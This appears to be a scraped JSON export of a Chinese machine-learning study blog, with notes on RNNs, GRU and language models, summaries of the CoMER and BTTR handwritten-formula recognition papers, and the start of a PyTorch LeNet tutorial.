其中二进制中低位数由0变为1的频率更快。而在之前使用的位置编码中，使用三角函数在编码维度上降低频率。由于输出是浮点数，因此此类线序表示会比二进制表示更节省空间。 RNN 序列模型 具有时序结构 例如电影评分随时间变化而变化 音乐、语言、文本、视频都是连续的 人的交互是连续的 统计工具 假设在时间ttt观察到xtx_txt​，那么得到T个不独立的随机变量：(x1,...,xt)∼p(X)(x_1,...,x_t) \\sim p(X)(x1​,...,xt​)∼p(X) 使用条件概率展开得到： p(a,b)=p(a)p(b∣a)=p(b)p(a∣b)p(a,b) = p(a)p(b|a) = p(b)p(a|b)p(a,b)=p(a)p(b∣a)=p(b)p(a∣b) 则:p(X)=p(x1)⋅p(x2∣x1)⋅p(x3∣x1,x2)⋅...⋅p(xT∣x1,...,xT−1)p(X) = p(x_1)\\cdot p(x_2|x_1)\\cdot p(x_3|x_1,x_2)\\cdot ... \\cdot p(x_T|x_1,...,x_{T-1})p(X)=p(x1​)⋅p(x2​∣x1​)⋅p(x3​∣x1​,x2​)⋅...⋅p(xT​∣x1​,...,xT−1​) 或者反序计算：p(X)=p(xT)⋅p(xT−1∣xT)⋅p(xT−2∣xT−1,xT)⋅...⋅p(x1∣x2,...,xT)p(X) = p(x_T)\\cdot p(x_{T-1}|x_T)\\cdot p(x_{T-2}|x_{T-1},x_T)\\cdot ... \\cdot p(x_1|x_2,...,x_T)p(X)=p(xT​)⋅p(xT−1​∣xT​)⋅p(xT−2​∣xT−1​,xT​)⋅...⋅p(x1​∣x2​,...,xT​) 对于条件概率建模：p(xt∣x1,...,xt−1)=p(xt∣f(x1,...,xt−1))p(x_t|x_1,...,x_{t-1}) = p(x_t|f(x_1,...,x_{t-1}))p(xt​∣x1​,...,xt−1​)=p(xt​∣f(x1​,...,xt−1​)) 我们已知前t-1个时刻的信息，那么要根据这些信息建模来预测t时刻的信息，这种方式也成为自回归模型 方案A-马尔科夫假设 假设当前数据只与τ\\tauτ个过去数据点相关 p(xt∣x1,...,xt−1)=p(xt∣xt−τ,...,xt−1)=p(xt∣f(xt−τ,...,xt−1))p(x_t|x_1,...,x_{t-1}) = p(x_t|x_{t-\\tau},...,x_{t-1})\\\\ =p(x_t|f(x_{t-\\tau},...,x_{t-1}))p(xt​∣x1​,...,xt−1​)=p(xt​∣xt−τ​,...,xt−1​)=p(xt​∣f(xt−τ​,...,xt−1​)) 方案B-潜变量模型 引入潜变量hth_tht​来表示过去信息ht=f(x1,...,xt−1)h_t = f(x_1,...,x_{t-1})ht​=f(x1​,...,xt−1​) 这样xt=p(xt∣ht)x_t = p(x_t|h_t)xt​=p(xt​∣ht​) 文本预处理 将文本中的标点转换为空格 按行分开 将文本拆分为单词或token 构建一个字典，从字符串映射到一个从0开始的数字索引 然后将每一行中的每一个token转换为索引输出，称为corpus 语言模型 给定一个文本序列x1,...,xTx_1,...,x_Tx1​,...,xT​，语言模型的目标是估计联合概率p(x1,...,xT)p(x_1,...,x_T)p(x1​,...,xT​) 应用包括： 做预训练模型（BERT，GPT-3） 生成文本 本段多个序列中哪个更常见 例如使用序列长度为2的模型，预测： p(x,x′)=p(x)p(x′∣x)=n(x)xn(x,x′)n(x)=n(x,x′)np(x,x&#x27;) = p(x)p(x&#x27;|x) = \\frac{n(x)}{x} \\frac{n(x,x&#x27;)}{n(x)}=\\frac{n(x,x&#x27;)}{n}p(x,x′)=p(x)p(x′∣x)=xn(x)​n(x)n(x,x′)​=nn(x,x′)​ 上述公式中n是总词数(文本数据中token的总数)，n(x)表示x在文本数据中出现的次数；n(x,x′)n(x,x&#x27;)n(x,x′)表示连续单词(x,x′)(x,x&#x27;)(x,x′)在文本数据中出现的次数 但当序列很长的时候，因为文本量不够大，很可能n(x1,...,xT)≤1n(x_1,...,x_T) \\leq 1n(x1​,...,xT​)≤1 于是可以使用马尔科夫假设缓解这个问题： N元语法：即认为马尔可夫假设中的τ=N−1\\tau = N-1τ=N−1 →^→\\to {\\hat{}} \\to→^→ GRU 由于RNN处理长序列时，隐藏变量由于隐藏了非常多的信息，那么其对于很久以前的信息表示的就不够明确。 为了解决这一问题，我们发现事实上一个序列中并不是每个观察值都同等重要，模型只需要记住相关的观察重点。 而RNN并没有这一机制，RNN将所有单元都视为同等重要。 因此提出了两个门控单元： 能关注的机制（更新门） 能遗忘的机制（重置门） 门 在计算每个单元的隐藏状态时，计入两个门控单元，对H和X进行计算，其中σ\\sigmaσ表示sigmoid函数。 候选隐藏状态 候选隐状态实际上是在普通RNN的隐状态中使用R与上一时刻的隐状态相乘，由于R通过sigmoid函数计算得到，因此其中的数字位于[0,1][0,1][0,1]之间，即可以被理解为R学习到了上一时刻的隐状态中，哪些比较重要（值接近1）哪些不太重要可以遗忘（值接近0） 隐状态 使用Z控制改单元是否忽略掉当前的元素Xt，即当Zt接近1的时候，输出隐状态直接使用上一次的隐状态，即不包含当前元素Xt的信息，而Zt接近0的时候则近似等于普通RNN","categories":[{"name":"硕士研究生","slug":"硕士研究生","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"机器学习入门","slug":"硕士研究生/机器学习入门","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"},{"name":"RNN","slug":"硕士研究生/机器学习入门/RNN","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/RNN/"},{"name":"Transformer","slug":"硕士研究生/机器学习入门/RNN/Transformer","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/RNN/Transformer/"},{"name":"注意力机制","slug":"硕士研究生/机器学习入门/RNN/Transformer/注意力机制","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/RNN/Transformer/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"},{"name":"自注意力机制","slug":"硕士研究生/机器学习入门/RNN/Transformer/注意力机制/自注意力机制","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/RNN/Transformer/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/%E8%87%AA%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"},{"name":"端到端","slug":"硕士研究生/机器学习入门/RNN/Transformer/注意力机制/自注意力机制/端到端","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/RNN/Transformer/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/%E8%87%AA%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/%E7%AB%AF%E5%88%B0%E7%AB%AF/"},{"name":"编码解码架构","slug":"硕士研究生/机器学习入门/RNN/Transformer/注意力机制/自注意力机制/端到端/编码解码架构","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/RNN/Transformer/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/%E8%87%AA%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/%E7%AB%AF%E5%88%B0%E7%AB%AF/%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E6%9E%B6%E6%9E%84/"}],"tags":[{"name":"环境搭建","slug":"环境搭建","permalink":"http://enderxiao.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"PyTorch","slug":"PyTorch","permalink":"http://enderxiao.github.io/tags/PyTorch/"},{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/tags/Python/"},{"name":"RNN","slug":"RNN","permalink":"http://enderxiao.github.io/tags/RNN/"},{"name":"编码解码架构","slug":"编码解码架构","permalink":"http://enderxiao.github.io/tags/%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E6%9E%B6%E6%9E%84/"}]},{"title":"CoMER论文阅读","slug":"CoMER论文阅读","date":"2022-12-06T06:24:53.000Z","updated":"2024-07-30T11:26:33.906Z","comments":true,"path":"2022/12/06/CoMER论文阅读/","permalink":"http://enderxiao.github.io/2022/12/06/CoMER%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"","text":"摘要 发表于ECCV2022，针对现有基于Transformer的数学公式识别方法中存在的注意力覆盖不足的问题，提出一种新的注意力精炼模块（ARM），将RNN模型广泛采用的覆盖注意力机制巧妙地应用在Transformer中，在不影响并行性的前提下，利用过去的对齐信息精炼注意权重。另外本文还提出自覆盖和交叉覆盖两种模块，利用来自当前层和前一层的过去对齐信息，更好地利用覆盖信息。 背景 Encoder-Decoder架构由于可以在编码器部分进行特征提取，在解码器部分进行语言建模，在HMER领域被广泛应用。虽然Transformer在NLP领域已经成为基础模型，但在HMER任务上性能相较于RNN还不太令人满意。作者观察到现有Transformer与RNN一样会收到缺少覆盖注意力机制的影响，即过解析——图像某些部分被不必要地多次解析；以及欠解析——某些区域未被解析。RNN解码器使用覆盖注意力机制来缓解这一问题。然而，Transformer解码器所采用的点积注意力没有这样的覆盖机制，作者认为这是限制其性能的关键。 不同于RNN，Transformer中每一步的计算是相互独立的。虽然这种特性提高了Transformer中的并行性，但也使得解码器中直接使用以前工作中的覆盖机制变得困难。 为了解决这一问题，作者提出了一种利用Transformer解码器中覆盖信息的新模型CoMER。手RNN中覆盖机制的启发，作者希望Transformer将更多注意力分配到尚未解析的区域。 作者提出注意精炼模块ARM。同时为了充分利用了来自不同层的过去对齐信息，作者提出了自覆盖和交叉覆盖，分别利用来自当前层和前一层的过去对齐信息。作者进一步证明，在HMER任务中，CoMER的性能优于标准Transformer解码器和RNN解码器 方法 CNN编码器 本文使用DenseNet并在末端增加1*1卷积 位置编码 本文与BTTR作法一致，同时使用图像位置编码和字符位置编码 注意力精炼模块ARM 如果Transformer直接采用RNN式的覆盖注意力机制，将产生一个具有O(TLhd)O(TLhd)O(TLhd)空间复杂度的覆盖矩阵F∈RT×L×h×dattnF \\in R^{T\\times L \\times h \\times d_{attn}}F∈RT×L×h×dattn​，这样难以接受。问题的关键在于覆盖矩阵需要先于其他特征向量相加，再乘以向量va∈Rdattnv_a \\in R^{d_{attn}}va​∈Rdattn​。如果可以先将覆盖矩阵与VaV_aVa​相乘，再加上LuongAttention的结果，空间复杂度将大大降低到O(TLh)O(TLh)O(TLh)，因此作者将注意力机制修改为： 其中相似向量et′e&#x27;_tet′​可分为注意项和精炼项rt∈RLr_t \\in R^Lrt​∈RL。需要注意的是，精炼项可以通过覆盖函数直接由累积ctc_tct​向量生成，从而避免了具有为维数为dattnd_{attn}dattn​的中间项。作者将上市命名为注意力精炼框架 为了在Transformer中使用这一框架，作者提出了如图所示的注意精炼模块(ARM)。可以将Transformer中的点积矩阵E∈RT×L×hE \\in R^{T \\times L \\times h}E∈RT×L×h作为注意项，精炼项矩阵R需要从经过Softmax后的注意权值A中计算出来。作者使用了注意权值A来提供历史对齐信息，具体的选择会在下一小节介绍。 作者定义了一个将注意力权重A∈RT×L×hA \\in R^{T\\times L \\times h}A∈RT×L×h作为输入，输出为精炼矩阵R∈RT×L×hR \\in R^{T\\times L \\times h}R∈RT×L×h 的函数ϕ:RT×L×h→RT×L×h\\phi : R^{T\\times L\\times h} \\to R^{T\\times L \\times h}ϕ:RT×L×h→RT×L×h R=ϕ(A)=norm(max(0,K∗C~+bc)Wc)R = \\phi(A) = norm(max(0,K * \\tilde C + b_c)W_c)R=ϕ(A)=norm(max(0,K∗C~+bc​)Wc​) C~=reshape(C)∈RT×ho×wo×h\\tilde C = reshape(C) \\in R^{T \\times h_o \\times w_o \\times h}C~=reshape(C)∈RT×ho​×wo​×h ct=∑k=1t−1ak∈RL×hc_t = \\sum_{k=1}^{t-1} a_k \\in R^{L \\times h}ct​=∑k=1t−1​ak​∈RL×h 其中ata_tat​是在时间步t∈[0,T)t \\in [0,T)t∈[0,T)时的注意力权重。K∈Rkc×kc×h×dcK \\in R^{k_c \\times k_c \\times h \\times d_c}K∈Rkc​×kc​×h×dc​代表一个卷积核，*代表卷积操作。bcb_cbc​是一个偏置项，Wc∈Rdc×hW_c \\in R^{d_c \\times h}Wc​∈Rdc​×h是一个线性投影矩阵。 作者认为函数ϕ\\phiϕ可以提取局部覆盖特征来检测已解析区域的边缘，并识别传入的未解析区域，最终作者通过减去精炼项R来达到精炼注意力项E的目的。 覆盖注意力 本节将介绍注意权重A的具体选择。作者提出了自覆盖、交叉覆盖以及融合覆盖三种模式，以利用不同阶段的对齐信息。 自覆盖: 自覆盖是指使用当前层生成的对齐信息作为注意精炼模块的输入。对于当前层j，首先计算注意权重A(j)A^{(j)}A(j)，并对其进行精炼 A(j)=softmax(E(j)∈RT×L×h)A^{(j)} = softmax(E^{(j)} \\in R^{T \\times L \\times h})A(j)=softmax(E(j)∈RT×L×h) E^(j)=ARM(E(j),A(j))\\hat E ^{(j)} = ARM(E^{(j)}, A^{(j)})E^(j)=ARM(E(j),A(j)) A^(j)=softmax(E^(j))\\hat A ^{(j)} = softmax(\\hat E ^{(j)})A^(j)=softmax(E^(j)) 其中E^(j)\\hat E^{(j)}E^(j)代表了精炼后的点积结果。A^(j)\\hat A ^{(j)}A^(j)代表在j层精炼后的注意力权重。 交叉覆盖：作者利用Transformer中解码层相互堆叠的特性，提出了一种新的交叉覆盖方法。交叉覆盖使用前一层的对齐信息作为当前层ARM的输入。j为当前层，我们使用精炼后的注意力权重：A^(j−1)\\hat A^{(j-1)}A^(j−1)之前(j−1)(j-1)(j−1)层来精炼当前层的注意力项 E^(j)=ARM(E(j),A^(j−1))\\hat E ^{(j)} = ARM(E^{(j)},\\hat A ^{(j-1)})E^(j)=ARM(E(j),A^(j−1)) A^(j)=softmax(E^(j))\\hat A ^{(j)} = softmax(\\hat E ^{(j)})A^(j)=softmax(E^(j)) **融合覆盖：**将自覆盖和交叉覆盖相结合，作者提出了一种新的融合覆盖方法，充分利用从不同层生成的过去对齐信息。 E^(j)=ARM(E(j),[A(j);A^(j−1)])\\hat E^{(j)} = ARM(E^{(j)},[A^{(j)};\\hat A^{(j-1)}])E^(j)=ARM(E(j),[A(j);A^(j−1)]) A^(j)=softmax(E^(j))\\hat A ^{(j)} = softmax(\\hat E^{(j)})A^(j)=softmax(E^(j)) 其中[A(j);A^(j−1)]∈RT×L×2h[A^{(j)};\\hat A^{(j-1)}] \\in R^{T \\times L \\times 2h}[A(j);A^(j−1)]∈RT×L×2h表示来自当前层的注意权重与来自前一层的精炼注意权重精选拼接。 数据集 CROHME14 CROHME16 CROHME19","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"科研","slug":"研究生/科研","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/"},{"name":"OCR","slug":"研究生/科研/OCR","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/"}],"tags":[{"name":"手写体识别","slug":"手写体识别","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E5%86%99%E4%BD%93%E8%AF%86%E5%88%AB/"},{"name":"深度神经网络","slug":"深度神经网络","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"深度学习","slug":"深度学习","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"注意力机制","slug":"注意力机制","permalink":"http://enderxiao.github.io/tags/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"}]},{"title":"BTTR论文阅读","slug":"BTTR论文阅读","date":"2022-12-05T02:44:26.000Z","updated":"2024-07-30T11:26:33.905Z","comments":true,"path":"2022/12/05/BTTR论文阅读/","permalink":"http://enderxiao.github.io/2022/12/05/BTTR%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"","text":"摘要 处于encoder-decoder结构在许多不同的领域取得了很好的成效，而本文采用基于transformer的解码器代替基于RNN的解码器，使整个模型体系结构更简洁，并且引入新的训练策略来充分利用transformer在双向语言建模中的潜力。 改进 本文提出现存方法在不同程度上存在覆盖范围缺乏的问题，主要有两种方式： 过解析 欠解析 过解析意味着手写图像识别(HME)图像中的某些区域被多次冗余翻译 欠解析则表示某些区域仍然未翻译 大多数encoder-decoder是基于RNN，RNN中当前单元的输出仅取决于上一隐藏层的参数，由于梯度消失等问题，他们很难发现距离很远的两个字符之间的关系。这一问题在HMER任务中暴露得更为明显，因为对于Latex结构而言，RNN很难捕获到两个相距较远的&#123;和&#125;符号之间的关系，导致基于Latex语法规范的识别错误。 传统的自回归模型在推理阶段使用从左到右逐个预测的方式。这种方式可能产生不平衡的输出，例如前缀预测比后缀更准确。为了克服这一问题，本文提出采用两个独立的编码器，分别从左到右和从右到左的方向训练。然而，这将导致训练参数的增加，因此本文采用单一解码器进行双向语言建模。 本文使用位置编码缓解了覆盖问题，提出了一种新的双向训练策略。 方法 HMER简述 手写公式识别目前分为两类方法： 基于语法 基于encoder-decoder 基于语法 该方法通过： 符号分割 符号识别 结构分析三个部分进行 需要研究人员提出预定义语法，如随机上下文无关语法、关系语法、定子句语法。这些语法规则不由数据驱动，需要手工设计，不能从大型数据集中获益 基于encoder-decoder 在HMER任务中，Zhang等观察到了覆盖缺乏的问题，并提出WAP用于HMER任务。后续研究中DenseWAP用DenseNet编码器取代WAP中的VGG。DenseWAP-TD通过用树形解码器替换字符串解码器，增强了模型处理复杂公式的能力。Wu等人使用笔画信息，将HMER制定为一个图到图的建模任务。这种基于编码器的模型在多个CROHME竞赛中获得了优异成绩。 Transformer 一种完全基于注意力机制的神经网络结构。其内部自注意力机制使Transformer相比于RNN取得了两个方面突破： transformer不需要像RNN那样依赖于上一步状态。并行化使得transformer在训练阶段能够节约更多时间。 同一序列中的标记通过自注意力机制直接建立一对一连接。这种机制解决了RNN梯度消失的问题，使Transformer比RNN更适用于长序列处理。 近年来，在CV和NLP领域中，RNN正在被Transformer取代。 R2L语言模型 为了解决传统模型只能适用于从左到右的语言模型的缺陷，许多学者尝试了从右向左的语言模型。但目前目前提出的方案都不可避免的增加了模型的复杂度。本文提出的单解码器双向语言模型能够很好的保持模型的简洁性。 本文方法 CNN编码器 本文使用DenseNet作为HME图像特征提取器，本文在编码部分添加了一个1*1的卷积层，用于将图片的特征维度调整为embedding dimension以便进行之后的处理 位置编码 由于transformer模型本身对每个输入向量没有任何位置感，因此我们使用两种类型的位置编码来处理这些信息。详细地说，我们分别使用图像位置编码和词位置编码来表示图像特征位置和词向量位置。 词向量位置编码 对于给定的位置pospospos和维度ddd，则词向量位置编码定义为： ppos,dW[2i]=sin(pos/10002i/d)ppos,dW[2i+1]=cos(pos/10002i/d)p^{W}_{pos,d}[2i] = sin(pos/1000^{2i/d}) \\\\ p^{W}_{pos,d}[2i + 1] = cos(pos/1000^{2i/d})ppos,dW​[2i]=sin(pos/10002i/d)ppos,dW​[2i+1]=cos(pos/10002i/d) 其中iii为维度索引 图像位置编码 采用二维归一化位置编码来表示图像的位置特征 首先计算正弦位置编码ppos,d/2Wp^W_{pos,d/2}ppos,d/2W​，然后将他们连接在一起。 对于一个二维位置坐标(x,y)(x,y)(x,y)，且与字位置编码相同的维数d，将图像位置编码向量px,y,dIp^I_{x,y,d}px,y,dI​表示为： x‾=xH,y‾=yWPx,y,dI=[px‾,d/2W;py‾,d/2W]\\overline {x} = \\frac{x}{H}, \\overline y = \\frac{y}{W} \\\\ P^I_{x,y,d} = [p^W_{\\overline {x}, d/2}; p^W_{\\overline {y}, d/2}]x=Hx​,y​=Wy​Px,y,dI​=[px,d/2W​;py​,d/2W​] Transformer编码器 每个基本的transformer层模块由四个基本部分组成。 比例缩放的点积注意力 这种注意机制本质上是基于查询和键之间的相似性，使用查询从键-值对中获取值。 Attention(Q,K,V)=softmax(QKTdk)VAttention(Q,K,V) = softmax(\\frac{QK^{T}}{\\sqrt{d_k}})VAttention(Q,K,V)=softmax(dk​​QKT​)V 关于为什么dot-product attention需要被scaled参考文章 多头注意力机制 通过多头机制，比例缩放的点积注意力模块可以共同关注多个表示子空间的特征映射。 Hi=Attention(QWiQ,KWiK,VWiV)MultiHead(Q,K,V)=[H1;...;Hh]WoH_i = Attention(QW_i^Q, KW_i^K, VW_i^V) \\\\ MultiHead(Q,K,V) = [H_1;...;H_h]W^oHi​=Attention(QWiQ​,KWiK​,VWiV​)MultiHead(Q,K,V)=[H1​;...;Hh​]Wo 带掩模的多头注意力 在解码器部分，由于自回归特性，根据输入图像和先前生成的符号来预测下一个符号。在训练阶段，使用一个下三角形掩模矩阵，使自注意模块能够限制每个时间步长的注意区域。由于掩模的多头注意机制，整个训练过程只需要一次前向计算。 前馈网络 位置前馈网络(FNN)由三个操作组成：一个线性变换、一个ReLU激活函数和另一个线性变换。 经过多头注意，不同步长之间的信息已经充分交换。FFN使每个步长能够单独整合自己的内部信息。 FFN(x)=max(0,xW1+b1)W2+b2FFN(x) = max(0, xW_1 + b_1)W_2 + b_2FFN(x)=max(0,xW1​+b1​)W2​+b2​ 双向训练 首先，在字典中引入了两个特殊的符号&lt;SOS&gt;&lt;SOS&gt;&lt;SOS&gt;和$ 来表示序列的开始和结束。对于目标Latex序列来表示序列的开始和结束。对于目标Latex序列来表示序列的开始和结束。对于目标Latex序列y={y_{1},…y_{T}}$，我们将目标序列: 从左到右(L2R)表示为：y⃗={&lt;SOS&gt;，y1，…，yT，&lt;EOS&gt;}\\vec y=\\{&lt;SOS&gt;，y_{1}，…，y_{T}，&lt;EOS&gt;\\}y​={&lt;SOS&gt;，y1​，…，yT​，&lt;EOS&gt;} 从右到左(R2L)表示为：y←={&lt;EOS&gt;，yT，…，y1，&lt;SOS&gt;}\\overleftarrow y=\\{&lt;EOS&gt;，y_{T}，…，y_{1}，&lt;SOS&gt;\\}y​={&lt;EOS&gt;，yT​，…，y1​，&lt;SOS&gt;} 以图像x和模型参数θ为条件，传统的自回归模型需要计算概率分布： p(y⃗j∣y⃗&lt;j,x,θ)p(\\vec y_j | \\vec y_{&lt;j}, x, \\theta)p(y​j​∣y​&lt;j​,x,θ) j是目标序列中的索引 在本文中，由于transformer模型本身实际上并不关心输入符号的顺序，因此我们可以使用单个transformer解码器来进行双向语言建模。 p(y←j∣y←&lt;j，x，θ)p(\\overleftarrow y_j∣\\overleftarrow y_{&lt;j}，x，θ)p(y​j​∣y​&lt;j​，x，θ) 为了实现这一目标，提出了一种简单而有效的双向训练策略，对于每个训练样本，我们将Latex序列生成两个目标序列L2R和R2L，并计算同一批的训练损失。与单向语言建模相比，我们的方法训练了一个模型，在不牺牲模型简洁性的情况下执行双向语言建模。 网络 在编码器部分，为了与当前最好的方法进行公平的比较，我们使用了与DenseWAP模型相同的DenseNet特征提取器。具体来说，在主干网络中使用了bottleneck层，并在它们之间添加过渡层，以减少特征图的数量。在每个bottleneck中，我们将增长率设置为k=24，每个块的深度设置为D=16，过渡层的压缩超参数设置为θ=0.5。 在解码器部分，我们使用了标准的transformer模型。我们将embedded维度和模型维度设置为d=256，多头注意模块的头数设置为H=8，FFN中间层维数设置为d=1024，transformer层数设置为N=3。dropout设置为0.3用来防止过拟合。 训练 我们的训练目标是使预测真实标签的概率最大化，所以我们使用标准的交叉熵损失函数来计算在每个编码位置真实值与预测概率之间的损失。给定训练样本{x(z)y(z)}z=1Z\\{x^{(z)}y^{(z)}\\}^{Z}_{z=1}{x(z)y(z)}z=1Z​，优化的目标函数如下： L⃗j(z)(θ)=−logp(y⃗j(z)∣y⃗&lt;j(z),x(z),θ)\\vec L^{(z)}_j(\\theta) = -log p(\\vec y_j^{(z)}|\\vec y_{&lt;j}^{(z)},x^{(z)}, \\theta)Lj(z)​(θ)=−logp(y​j(z)​∣y​&lt;j(z)​,x(z),θ) L←j(z)(θ)=−logp(y←&lt;j(z),x(z),θ)\\overleftarrow L_j^{(z)}(\\theta) = -logp(\\overleftarrow y_{&lt;j}^{(z)}, x^{(z)}, \\theta)Lj(z)​(θ)=−logp(y​&lt;j(z)​,x(z),θ) L(θ)=12ZL∑z=1Z∑z=1,j=1L(L⃗j(z)(θ)+L←j(z)(θ))L(\\theta) = \\frac{1}{2ZL} \\sum_{z=1}^Z \\sum_{z=1,j=1} ^L (\\vec L_j ^{(z)}(\\theta) + \\overleftarrow L_j ^{(z)} (\\theta))L(θ)=2ZL1​∑z=1Z​∑z=1,j=1L​(Lj(z)​(θ)+Lj(z)​(θ)) 该模型使用Adadelta算法从头开始进行训练，权重衰减为10−4，ρ=0.9，ϵ \\epsilonϵ=10−6。使用PyTorch框架来实现。该模型在四个NVIDIA 1080Ti gpu上进行训练，具有11×4GB内存。 前向推理 可用如下计算公式得到Latex序列： $ \\hat y =argmaxp(y∣x,θ)$ x为输入图像，θ为模型参数。 不像训练阶段，使用下三角掩模矩阵同时生成所有时间步长的预测。由于我们没有真实的标签，所以我们只能逐个地预测符号，直到“End”符号或达到预定义的最大长度。 显然，我们不能搜索所有可能的序列，因此提出了一种启发式集束搜索（beam search）来平衡计算成本和决策质量。此外，利用我们的解码器能够进行双向语言建模，使用近似联合搜索来提高性能。其基本思想包括三个步骤： 首先，在L2R和R2L方向上使用双向训练的transformer进行波束搜索，得到两个前k的最好预测。 然后，我们将L2R假设反转为R2L方向，将R2L假设转化为L2R方向，并将这些假设作为真实标签，计算训练阶段的损失值。 最后，将这些损失值加到它们原来的假设分数中，得到最终的分数，然后用于找到最佳候选值。在实践中，我们设置光束大小为k=10，最大长度为200，长度惩罚为α=1.0。 数据集 CROHME14 CROHME16 CROHME19","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"科研","slug":"研究生/科研","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/"},{"name":"OCR","slug":"研究生/科研/OCR","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/"}],"tags":[{"name":"手写体识别","slug":"手写体识别","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E5%86%99%E4%BD%93%E8%AF%86%E5%88%AB/"},{"name":"深度神经网络","slug":"深度神经网络","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"深度学习","slug":"深度学习","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"注意力机制","slug":"注意力机制","permalink":"http://enderxiao.github.io/tags/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"}]},{"title":"动手学深度学习-CNN","slug":"动手学深度学习-深度学习网络","date":"2022-11-18T10:30:24.000Z","updated":"2024-07-30T11:26:33.931Z","comments":true,"path":"2022/11/18/动手学深度学习-深度学习网络/","permalink":"http://enderxiao.github.io/2022/11/18/%E5%8A%A8%E6%89%8B%E5%AD%A6%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%BD%91%E7%BB%9C/","excerpt":"常用卷积神经网络（CNN）","text":"常用卷积神经网络（CNN） LeNet LeNet最早由YannLeCun在1989年提出，目的是识别图像中的手写数字。 总体来看，LeNet（LeNet-5）由两个部分组成： 卷积编码器：由两个卷积层组成 全连接层密集快：由三个全连接层组成 该网络的结构如下： 每个卷积块中的基本单元包含以下结构： 一个卷积层 一个sigmoid激活函数 平均池化层 每个卷积层使用5 * 5卷积核和一个sigmoid激活函数。这些层将输入映射到多个二维特征输出，通常同时增加通道的数量。 每个kernel=2, stride=2的池化操作通过空间下采样将维数减少4倍。 接下来使用Pytorch实现以下LeNet： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115import torchfrom torch import nnfrom d2l import torch as d2l# TODO: 构建网络class Reshape(torch.nn.Module): def forward(self, x): return x.view(-1, 1, 28, 28)net = torch.nn.Sequential( Reshape(), # 此处输入为 1 * 28 * 28 nn.Conv2d(1, 6, kernel_size=5, padding=2), nn.Sigmoid(), # 输出为 6 * 28 * 28(28 - 5 + 